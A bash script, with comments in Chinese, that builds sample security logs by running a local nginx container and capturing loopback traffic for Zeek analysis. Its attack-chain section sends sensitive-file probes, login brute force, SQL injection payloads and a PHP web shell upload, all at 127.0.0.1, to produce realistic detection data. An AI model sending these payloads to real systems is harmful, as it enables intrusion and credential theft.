#!/usr/bin/env bash
# 在服务器上构造「真实」多源日志样本：Nginx 访问日志 + 认证日志 + Zeek 网络日志。
#
# 用法（服务器 ~/seclog 目录下执行）：
#   ./scripts/sample_env/capture_traffic.sh
#
# 前置：docker 可用，nginx:alpine、python:3.11-slim 镜像已在本地。
# 产出：
#   /vol4/seclog/samples/nginx/logs/access.log   真实 Nginx 访问日志
#   /vol4/seclog/samples/pcap/seclog-sample.pcap
#   （Zeek 产物由 run_zeek.sh 生成）
#
# 设计说明：
#   - 流量全部是真实 TCP 请求（curl 发起，本机回环），不是拼接的假日志；
#   - 攻击 payload 只指向本地容器，不扫描任何外部资产；
#   - 抓包用 scripts/sample_env/pcap_capture.py（标准库 AF_PACKET），
#     不依赖 tcpdump——部署机是定制 NAS 系统，宿主 tcpdump 与容器库不兼容。
set -euo pipefail

ROOT="${SECLOG_SAMPLE_ROOT:-/vol4/seclog/samples}"
SKILL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT="${SAMPLE_NGINX_PORT:-18080}"
CAPTURE_SECONDS="${CAPTURE_SECONDS:-45}"
IFACE="${CAPTURE_IFACE:-lo}"

mkdir -p "${ROOT}"/{nginx/conf,nginx/html,nginx/logs,pcap,zeek}
chmod 777 "${ROOT}/nginx/logs" "${ROOT}/pcap" 2>/dev/null || true

echo "[1/5] 启动样本站点（127.0.0.1:${PORT}）"
docker rm -f seclog-sample-nginx >/dev/null 2>&1 || true
docker run -d --name seclog-sample-nginx \
    -p "127.0.0.1:${PORT}:80" \
    -v "${SKILL_DIR}/nginx/nginx.conf:/etc/nginx/nginx.conf:ro" \
    -v "${ROOT}/nginx/logs:/var/log/nginx" \
    nginx:alpine >/dev/null

for _ in $(seq 1 30); do
    curl -s -o /dev/null "http://127.0.0.1:${PORT}/" && break
    sleep 0.5
done
echo "      站点就绪"

echo "[2/5] 启动抓包（AF_PACKET，网卡 ${IFACE}，端口 ${PORT}，持续 ${CAPTURE_SECONDS}s）"
docker rm -f seclog-sample-capture >/dev/null 2>&1 || true
docker run -d --name seclog-sample-capture \
    --net=host --cap-add=NET_RAW \
    -v "${SKILL_DIR}/pcap_capture.py:/pcap_capture.py:ro" \
    -v "${ROOT}/pcap:/pcap" \
    python:3.11-slim \
    python /pcap_capture.py --iface "${IFACE}" --port "${PORT}" \
        --output /pcap/seclog-sample.pcap --duration "${CAPTURE_SECONDS}" >/dev/null
sleep 3
echo "      抓包已开始"

BASE="http://127.0.0.1:${PORT}"

echo "[3/5] 生成正常业务流量"
for i in 1 2 3; do
    curl -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" "${BASE}/"
    curl -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" \
        "${BASE}/api/user?id=${i}"
done
curl -s -o /dev/null -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1" \
    -X POST -d "username=alice&password=Passw0rd!" "${BASE}/admin/login.php"

echo "[4/5] 生成攻击链流量（全部指向本地容器）"
# 阶段一：目录与敏感文件探测
for p in /.env /.git/config /wp-admin/ /phpmyadmin/ /config.php /admin/; do
    curl -s -o /dev/null -A "sqlmap/1.7.2#stable (https://sqlmap.org)" "${BASE}${p}"
done
# 阶段二：登录爆破
for i in $(seq 1 8); do
    curl -s -o /dev/null -A "python-requests/2.31.0" \
        -X POST -d "username=admin&password=wrong${i}" "${BASE}/admin/login.php"
done
# 阶段三：SQL 注入绕过
curl -s -o /dev/null -A "sqlmap/1.7.2#stable (https://sqlmap.org)" \
    -X POST --data-urlencode "username=admin" --data-urlencode "password=' OR 1=1--" \
    "${BASE}/admin/login.php"
curl -s -o /dev/null -A "sqlmap/1.7.2#stable (https://sqlmap.org)" \
    "${BASE}/api/user?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
# 阶段四：写入 webshell 并访问
curl -s -o /dev/null -A "Mozilla/5.0" \
    -X POST --data-urlencode "file=<?php system(\$_GET['c']); ?>" "${BASE}/uploads/shell.php"
curl -s -o /dev/null -A "Mozilla/5.0" "${BASE}/uploads/shell.php?c=id"

echo "[5/5] 等待抓包结束并落盘"
for _ in $(seq 1 60); do
    if ! docker ps --format '{{.Names}}' | grep -qx seclog-sample-capture; then break; fi
    sleep 2
done
docker rm -f seclog-sample-capture >/dev/null 2>&1 || true

echo
echo "完成。产出："
echo "  Nginx 日志  ${ROOT}/nginx/logs/access.log  ($(wc -l < "${ROOT}/nginx/logs/access.log" 2>/dev/null || echo 0) 行)"
echo "  PCAP        ${ROOT}/pcap/seclog-sample.pcap ($(du -h "${ROOT}/pcap/seclog-sample.pcap" 2>/dev/null | cut -f1))"
echo
echo "下一步：./scripts/sample_env/run_zeek.sh  解析 PCAP 并导出 Zeek 日志"
